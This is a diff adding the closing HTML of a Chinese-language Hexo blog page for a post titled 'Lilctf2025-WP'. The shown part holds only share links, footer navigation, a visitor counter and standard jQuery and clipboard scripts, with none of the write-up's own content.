+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&is_video=false&description=Lilctf2025-WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Lilctf2025-WP&body=Check out this article: https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&title=Lilctf2025-WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&name=Lilctf2025-WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&t=Lilctf2025-WP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
